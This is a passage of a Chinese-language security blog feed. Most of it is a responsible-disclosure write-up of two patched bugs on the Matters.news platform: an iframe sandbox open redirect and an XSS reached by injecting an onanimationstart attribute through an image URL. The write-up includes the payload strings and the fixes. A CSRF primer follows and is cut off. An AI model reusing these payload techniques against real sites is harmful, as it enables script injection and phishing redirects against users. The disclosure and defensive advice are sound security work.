keyword&quot;&gt;const&lt;/span&gt; prefix &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; size &lt;span class=&quot;token operator&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;/&#39;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token constant&quot;&gt;PROCESSED_PREFIX&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;/&#39;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; size &lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;&#39;&lt;/span&gt;&lt;br&gt;&lt;br&gt;  &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; assetDomain &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; prefix &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; extedUrl&lt;br&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;只要 domain 是 assets 的 domain 並符合其他條件，就會經過一些字串處理之後回傳。&lt;/p&gt;
&lt;p&gt;看到這邊，就大致上了解整個文章的 render 過程了。&lt;/p&gt;
&lt;p&gt;會在 server side 用 js-xss 這套 library 進行過濾，在 client side 這邊則是用 dangerouslySetInnerHTML 來 render，其中會先對 img tag 做一些處理，把 img 改成用 picture + source 的方式針對不同解析度或是螢幕尺寸載入不同的圖片。&lt;/p&gt;
&lt;p&gt;以上就是這個網站 render 文章的整個過程，再繼續往下看之前你可以想一下，有沒有什麼地方有問題？&lt;/p&gt;
&lt;p&gt;== 防雷分隔 ==&lt;br&gt;
== 防雷分隔 ==&lt;br&gt;
== 防雷分隔 ==&lt;br&gt;
== 防雷分隔 ==&lt;br&gt;
== 防雷分隔 ==&lt;br&gt;
== 防雷分隔 ==&lt;br&gt;
== 防雷分隔 ==&lt;br&gt;
== 防雷分隔 ==&lt;br&gt;
== 防雷分隔 ==&lt;br&gt;
== 防雷分隔 ==&lt;br&gt;
== 防雷分隔 ==&lt;br&gt;
== 防雷分隔 ==&lt;br&gt;
== 防雷分隔 ==&lt;br&gt;
== 防雷分隔 ==&lt;br&gt;
== 防雷分隔 ==&lt;/p&gt;
&lt;h2 id=&quot;%E7%AC%AC%E4%B8%80%E5%80%8B%E5%95%8F%E9%A1%8C%EF%BC%9A%E9%8C%AF%E8%AA%A4%E7%9A%84%E5%B1%AC%E6%80%A7%E9%81%8E%E6%BF%BE&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E7%AC%AC%E4%B8%80%E5%80%8B%E5%95%8F%E9%A1%8C%EF%BC%9A%E9%8C%AF%E8%AA%A4%E7%9A%84%E5%B1%AC%E6%80%A7%E9%81%8E%E6%BF%BE&quot;&gt;#&lt;/a&gt; 第一個問題：錯誤的屬性過濾&lt;/h2&gt;
&lt;p&gt;你有發現這邊的過濾有問題嗎？&lt;/p&gt;
&lt;pre class=&quot;language-js&quot;&gt;&lt;code class=&quot;language-js&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;token constant&quot;&gt;CUSTOM_WHITE_LISTS&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;  a&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;...&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;xss&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;whiteList&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;a &lt;span class=&quot;token operator&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;class&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;br&gt;  figure&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;br&gt;  figcaption&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;br&gt;  source&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&#39;src&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;type&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;br&gt;  iframe&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&#39;src&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;frameborder&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;allowfullscreen&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;sandbox&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;開放 iframe 應該是因為要讓使用者可以嵌入 YouTube 影片之類的東西，但問題是這個網站並沒有用 CSP 指定合法的 domain，因此這邊的 src 可以隨意亂填，我可以自己做一個網站然後用 iframe 嵌入。如果網頁內容設計得好，看起來就會是這個網站本身的一部分：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/rivVdiC.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;以上只是隨便填的一個範例，主要是讓大家看個感覺，如果真的有心想攻擊的話可以弄得更精緻，內容更吸引人。&lt;/p&gt;
&lt;p&gt;如果只是這樣的話，攻擊能否成功取決與內容是否能夠取信於使用者。但其實可以做到的不只這樣，大家知道在 iframe 裡面是可以操控外面的網站嗎？&lt;/p&gt;
&lt;p&gt;cross origin 的 window 之間能存取的東西有限，唯一能夠改變的是 &lt;code&gt;location&lt;/code&gt; 這個東西，意思就是我們可以在 iframe 裡面，把嵌入你的網站重新導向：&lt;/p&gt;
&lt;pre class=&quot;language-html&quot;&gt;&lt;code class=&quot;language-html&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;script&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token script&quot;&gt;&lt;span class=&quot;token language-javascript&quot;&gt;&lt;br&gt;  top&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;location &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;https://google.com&#39;&lt;/span&gt;&lt;br&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;script&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;這樣做的話，我就可以把整個網站重新導向到任何地方，一個最簡單能想到的應用就是重新導向到釣魚網站。這樣的釣魚網站成功機率是比較高的，因為使用者可能根本沒有意識到他被重新導向到其他網站了。&lt;/p&gt;
&lt;p&gt;其實瀏覽器針對這樣的重新導向是有防禦的，上面的程式碼會出現錯誤：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Unsafe attempt to initiate navigation for frame with origin &#39;&lt;a href=&quot;https://matters.news/&quot;&gt;https://matters.news&lt;/a&gt;&#39; from frame with URL &#39;&lt;a href=&quot;https://53469602917d.ngrok.io/&quot;&gt;https://53469602917d.ngrok.io/&lt;/a&gt;&#39;. The frame attempting navigation is targeting its top-level window, but is neither same-origin with its target nor has it received a user gesture. See &lt;a href=&quot;https://www.chromestatus.com/features/5851021045661696&quot;&gt;https://www.chromestatus.com/features/5851021045661696&lt;/a&gt;.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;Uncaught DOMException: Failed to set the &#39;href&#39; property on &#39;Location&#39;: The current window does not have permission to navigate the target frame to &#39;&lt;a href=&quot;https://google.com/&quot;&gt;https://google.com&lt;/a&gt;&#39;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;因為不是 same origin，所以會阻止 iframe 對 top level window 做導向。&lt;/p&gt;
&lt;p&gt;但是呢！這個東西是可以繞過的，會運用到 sandbox 這個屬性。這個屬性其實就是在指定嵌入的 iframe 有什麼權限，所以只要改成：&lt;code&gt;&amp;lt;iframe sandbox=&amp;quot;allow-top-navigation allow-scripts allow-same-origin&amp;quot; src=example.com&amp;gt;&amp;lt;/iframe&amp;gt;&lt;/code&gt;，就可以成功對 top level window 重新導向，把整個網站給導走。&lt;/p&gt;
&lt;p&gt;這個漏洞在 &lt;a href=&quot;https://ruvlol.medium.com/1000-for-open-redirect-via-unknown-technique-675f5815e38a&quot;&gt;GitLab&lt;/a&gt; 與 &lt;a href=&quot;https://github.com/hackmdio/codimd/issues/1263&quot;&gt;codimd&lt;/a&gt; 都有出現過。&lt;/p&gt;
&lt;p&gt;這邊的修正方式有幾個，第一個是可以先把 sandbox 這個屬性拿掉，讓這個屬性不能被使用。如果真的有地方需要用到的話，就需要檢查裡面的值，把比較危險的 &lt;code&gt;allow-top-navigation&lt;/code&gt; 給拿掉。&lt;/p&gt;
&lt;p&gt;再來的話也可以限制 iframe src 的位置，可以在不同層面做掉，例如說在程式碼裡面自己過濾 src，只允許特定 domain，或者是用 &lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-src&quot;&gt;CSP:frame-src&lt;/a&gt; 讓瀏覽器把這些不符合的 domain 自己擋掉。&lt;/p&gt;
&lt;h2 id=&quot;%E7%AC%AC%E4%BA%8C%E5%80%8B%E5%95%8F%E9%A1%8C%EF%BC%9A%E6%9C%AA%E9%81%8E%E6%BF%BE%E7%9A%84-html&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E7%AC%AC%E4%BA%8C%E5%80%8B%E5%95%8F%E9%A1%8C%EF%BC%9A%E6%9C%AA%E9%81%8E%E6%BF%BE%E7%9A%84-html&quot;&gt;#&lt;/a&gt; 第二個問題：未過濾的 HTML&lt;/h2&gt;
&lt;p&gt;第一個問題能造成最大的危險大概就是重新導向了（codimd 那一篇是說在 Safari 可以做出 XSS 啦，只是我做不出來 QQ），但是除了這個之外，還有一個更大的問題，那就是這邊：&lt;/p&gt;
&lt;pre class=&quot;language-js&quot;&gt;&lt;code class=&quot;language-js&quot;&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;&lt;br&gt;  &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;div&lt;br&gt;    className&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;classNames&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;u-content&#39;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token boolean&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; translating &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;    dangerouslySetInnerHTML&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;br&gt;    onClick&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;captureClicks&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;    ref&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;contentContainer&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;  &lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;&lt;br&gt;&lt;br&gt;  &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;style jsx&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;styles&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt;style&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;article.content&lt;/code&gt; 是經過 js-xss 過濾後的 HTML 字串，所以是安全的，但這邊經過了一個 &lt;code&gt;optimizeEmbed&lt;/code&gt; 去做自訂的轉換，在過濾以後還去改變內容其實是一件比較危險的事，因為如果處理的過程有疏忽，就會造成 XSS 的漏洞。&lt;/p&gt;
&lt;p&gt;在轉換裡面有一段程式碼為：&lt;/p&gt;
&lt;pre class=&quot;language-html&quot;&gt;&lt;code class=&quot;language-html&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;source&lt;/span&gt;&lt;br&gt;  &lt;span class=&quot;token attr-name&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;image/webp&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;  &lt;span class=&quot;token attr-name&quot;&gt;media&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;(min-width: 768px)&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;  &lt;span class=&quot;token attr-name&quot;&gt;srcSet&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;${toSizedImageURL({&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;&lt;span class=&quot;token namespace&quot;&gt;url:&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;src,&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;&lt;span class=&quot;token namespace&quot;&gt;size:&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;&#39;1080w&#39;,&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;&lt;span class=&quot;token namespace&quot;&gt;ext:&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;&#39;webp&#39;&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;})}&lt;/span&gt;&lt;br&gt;  &lt;span class=&quot;token special-attr&quot;&gt;&lt;span class=&quot;token attr-name&quot;&gt;onerror&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;token value javascript language-javascript&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;srcset&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&#39;${src}&#39;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token punctuation&quot;&gt;/&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;仔細看這段程式碼，如果 &lt;code&gt;${toSizedImageURL({ url: src, size: &#39;1080w&#39;, ext: &#39;webp&#39; })}&lt;/code&gt; 或是 &lt;code&gt;src&lt;/code&gt; 我們可以控制的話，就有機會能夠改變屬性的內容，或者是新增屬性上去。&lt;/p&gt;
&lt;p&gt;我原本想插入一個惡意的 src 讓 onerror 變成 &lt;code&gt;onerror=&amp;quot;this.srcset=&#39;test&#39;;alert(1)&amp;quot;&lt;/code&gt; 之類的程式碼，但我後來發現 picture 底下的 source 的 onerror 事件好像是無效的，就算 srcset 有錯也不會觸發，所以是沒用的。&lt;/p&gt;
&lt;p&gt;因此我就把焦點轉向 srcSet 以及插入新的屬性，這邊可以用 &lt;code&gt;onanimationstart&lt;/code&gt; 這個屬性，在 animation 開始時會觸發的一個事件，而 animation 的名字可以去 CSS 裡面找，很幸運地找到了一個 keyframe 叫做&lt;code&gt;spinning&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;因此如果 img src 為：&lt;code&gt;https://assets.matters.news/processed/1080w/embed/test style=animation-name:spinning onanimationstart=console.log(1337)&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;結合後的程式碼就是：&lt;/p&gt;
&lt;pre class=&quot;language-html&quot;&gt;&lt;code class=&quot;language-html&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;source&lt;/span&gt;&lt;br&gt;  &lt;span class=&quot;token attr-name&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;image/webp&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;  &lt;span class=&quot;token attr-name&quot;&gt;media&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;(min-width: 768px)&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;   &lt;br&gt;  &lt;span class=&quot;token attr-name&quot;&gt;srcSet&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;https://assets.matters.news/processed/1080w/embed/test&lt;/span&gt; &lt;br&gt;  &lt;span class=&quot;token special-attr&quot;&gt;&lt;span class=&quot;token attr-name&quot;&gt;style&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token value css language-css&quot;&gt;&lt;span class=&quot;token property&quot;&gt;animation-name&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;spinning&lt;/span&gt;&lt;/span&gt;&lt;/span&gt; &lt;br&gt;  &lt;span class=&quot;token attr-name&quot;&gt;onanimationstart&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;console.log(1337)&lt;/span&gt;&lt;br&gt;  &lt;span class=&quot;token special-attr&quot;&gt;&lt;span class=&quot;token attr-name&quot;&gt;onerror&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;token value javascript language-javascript&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;srcset&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&#39;${src}&#39;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token punctuation&quot;&gt;/&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;如此一來，就製造了一個 XSS 的漏洞：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/nyugLUH.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;
&lt;img src=&quot;https://i.imgur.com/iYLI0ku.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;修補方式也有幾個：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;新增 CSP header 阻止 inline script 的執行（這比較難做到，因為可能會跟現有東西牴觸，需要較多時間處理）&lt;/li&gt;
&lt;li&gt;過濾傳進來的 img url（如果過濾不好一樣有風險）&lt;/li&gt;
&lt;li&gt;先改變 HTML，才去呼叫 js-xss 幫你濾掉不該存在的屬性&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&quot;%E7%B8%BD%E7%B5%90&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E7%B8%BD%E7%B5%90&quot;&gt;#&lt;/a&gt; 總結&lt;/h2&gt;
&lt;p&gt;我們找到了兩個漏洞：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;透過 &lt;code&gt;&amp;lt;iframe&amp;gt;&lt;/code&gt; 把使用者導到任意位置&lt;/li&gt;
&lt;li&gt;透過 &lt;code&gt;&amp;lt;source&amp;gt;&lt;/code&gt; 執行文章頁面的 XSS 攻擊&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;那實際上到底可以做到什麼樣的攻擊呢？&lt;/p&gt;
&lt;p&gt;可以先用第二個漏洞發表一篇有 XSS 攻擊的文章，再寫一個機器人去所有文章底下留言，利用 &lt;code&gt;&amp;lt;iframe&amp;gt;&lt;/code&gt; 把使用者導到具有 XSS 的文章。如此一來，只要使用者點擊任何一篇文章都會被攻擊到。&lt;/p&gt;
&lt;p&gt;不過網站本身其他地方的防禦做得不錯，儘管有 XSS 但 Cookie 是 HttpOnly 的所以偷不走，修改密碼是用寄信的所以也沒辦法修改密碼，似乎沒辦法做到真的太嚴重的事情。&lt;/p&gt;
&lt;p&gt;許多過濾 XSS 的 library 本身是安全的（雖然有些時候其實還是會被發現&lt;a href=&quot;https://portswigger.net/research/bypassing-dompurify-again-with-mutation-xss&quot;&gt;漏洞&lt;/a&gt;），但使用 library 的人可能忽略了一些設定或者是額外做了一些事情，導致最後產生出來的 HTML 依然是不安全的。&lt;/p&gt;
&lt;p&gt;在處理與使用者輸入相關的地方時，應該對於每一個環節都重新檢視一遍，看看是否有疏忽的地方。&lt;/p&gt;
&lt;p&gt;CSP 的 header 也建議設定一下，至少在真的被 XSS 時還有最後一道防線擋住。雖然說 CSP 有些規則也可以被繞過，但至少比什麼都沒有好。&lt;/p&gt;
&lt;p&gt;Matters 有自己的 &lt;a href=&quot;https://github.com/thematters/developer-resource/blob/master/SECURITY.md&quot;&gt;Bug Bounty Program&lt;/a&gt;，只要找到能證明危害的漏洞都有獎金可以拿，這篇找到的 XSS 漏洞被歸類在 High，價值 150 元美金。他們團隊相信開源能惠及技術人員，也能讓網站更安全，因此希望大家知道這個計畫的存在。&lt;/p&gt;
&lt;p&gt;最後，感謝 Matters 團隊快速的回覆以及處理，也感謝 Cymetrics 的同事們。&lt;/p&gt;
&lt;p&gt;時間軸：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;2021–05–07 回報漏洞&lt;/li&gt;
&lt;li&gt;2021–05–12 收到 Matters 團隊確認信，正在修補漏洞&lt;/li&gt;
&lt;li&gt;2021–05–12 詢問修補完是否能發表文章，獲得許可&lt;/li&gt;
&lt;li&gt;2021–05–13 修復完成&lt;/li&gt;
&lt;/ul&gt;

		</content>
	</entry>
	
	<entry>
		<title>零基礎資安系列（一）-認識 CSRF（Cross Site Request Forgery）</title>
		<link href="https://tech-blog.cymetrics.io/posts/jo/zerobased-cross-site-request-forgery/"/>
		<updated>2021-05-26T00:00:00-00:00</updated>
		<id>https://tech-blog.cymetrics.io/posts/jo/zerobased-cross-site-request-forgery/</id>
		<content type="html">
		  &lt;!-- summary --&gt;
&lt;h2 id=&quot;%E5%89%8D%E8%A8%80&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E5%89%8D%E8%A8%80&quot;&gt;#&lt;/a&gt; 前言&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;陌生人＝ &lt;strong&gt;Hacker&lt;/strong&gt; 菜單 ＝ &lt;strong&gt;Request&lt;/strong&gt;&lt;br&gt;
桌號＝ &lt;strong&gt;cookie 註1&lt;/strong&gt; 老闆＝ &lt;strong&gt;web server&lt;/strong&gt; 你 ＝ &lt;strong&gt;User&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;想像你到一家餐廳吃飯，陌生人拿了一張有你桌號的菜單點餐之後給老闆，結果老闆問也不問便收了菜單並將帳記到了你的身上，這就是 CSRF 的基礎概念。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;!-- summary --&gt;
&lt;h2 id=&quot;%E9%87%8B%E4%BE%8B&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E9%87%8B%E4%BE%8B&quot;&gt;#&lt;/a&gt; 釋例&lt;/h2&gt;
&lt;p&gt;CSRF ( Cross Site Request Forgery )，翻成中文叫做&lt;strong&gt;跨站請求偽造&lt;/strong&gt;，其實字面上把他猜成拆開成請求偽造和跨站之後就蠻好理解的，怎麼說呢？ 我以前言的例子來說明一下&lt;strong&gt;跨站請求偽造是怎麼一回事&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;先講請求偽造，請求偽造的意思很好理解，指的是陌生人拿了一張有你桌號的菜單點自己想點的餐之後給老闆這件事（ Hacker 用帶著你 cookie 的 Request 送給 web server ），那至於跨站跨在哪裡呢？&lt;/p&gt;
&lt;p&gt;跨在陌生人在你不知情的情況下把有你桌號的菜單送給了老闆，所以跨過了本該知情的你（送出的人不同，所以送出 Request 的 Domain 註2) 也會不同），CSRF 的本質在於 web server 無條件信任 cookie 而沒有再確認或以其他方式驗證（ 等於老闆問也不問無條件相信菜單上的桌號，也不看是誰送的），因此只能保證這個Request 發自某個 User ，卻不能保證請求本身是 User 自願發出的（ 等於菜單上的桌號是你的，但不代表這個菜是你點的 ）。&lt;/p&gt;
&lt;h2 id=&quot;csrf-%E6%94%BB%E6%93%8A%E6%B5%81%E7%A8%8B&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#csrf-%E6%94%BB%E6%93%8A%E6%B5%81%E7%A8%8B&quot;&gt;#&lt;/a&gt; CSRF 攻擊流程&lt;/h2&gt;
&lt;p&gt;用簡單的圖帶你看一下 Hacker 的犯案過程&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/jo/zerobased-cross-site-request-forgery/p1.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;User 訪問並登入 A 網站&lt;/li&gt;
